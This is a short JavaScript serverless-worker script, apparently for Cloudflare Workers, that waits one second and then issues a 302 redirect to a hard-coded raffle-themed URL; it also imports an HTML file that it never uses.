import welcome from "welcome.html";

/**
 * @typedef {Object} Env
 */

export default {
	async fetch(request) {
	  // Delay function that returns a promise resolved after 1 second (1000 ms)
	  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
  
	  // Wait for 1 second
	  await delay(1000);
  
	  // Redirect target domain (change this to your desired redirect URL)
	  const redirectUrl = "https://copingcentre.rafflenexus.com/a/winme-one";
  
	  return Response.redirect(redirectUrl, 302);
	}
  };
  
